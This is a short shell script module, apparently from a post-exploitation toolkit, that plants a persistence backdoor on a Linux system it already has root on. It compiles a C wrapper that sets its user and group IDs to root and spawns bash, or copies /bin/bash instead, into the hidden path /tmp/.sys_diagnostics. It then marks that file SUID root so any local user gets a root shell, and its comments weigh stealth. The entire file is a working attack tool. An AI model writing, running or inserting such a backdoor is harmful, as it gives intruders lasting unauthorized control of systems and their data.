# Persistence via SUID Binary
# Usage: load persistence/suid-backdoor.sh

print_header "Persistence: SUID Backdoor"

BACKDOOR_PATH="/tmp/.sys_diagnostics"

if is_root; then
    # Create a simple C wrapper to execute /bin/bash -p
    # We assume gcc exists, if not we try to copy bash directly (less stealthy)
    
    if command_exists gcc; then
        print_with_label "Compiling SUID wrapper..."
        echo 'int main() { setresuid(0,0,0); setresgid(0,0,0); system("/bin/bash"); return 0; }' > /tmp/suid.c
        gcc /tmp/suid.c -o "$BACKDOOR_PATH"
        rm /tmp/suid.c
    else
        print_warning "gcc not found. Copying /bin/bash directly."
        cp /bin/bash "$BACKDOOR_PATH"
    fi

    if [ -f "$BACKDOOR_PATH" ]; then
        chown root:root "$BACKDOOR_PATH"
        chmod 4755 "$BACKDOOR_PATH"
        print_success "SUID backdoor created at $BACKDOOR_PATH"
        ls -la "$BACKDOOR_PATH"
    else
        print_error "Failed to create backdoor file."
    fi
else
    print_error "Root privileges required to create SUID backdoor."
fi
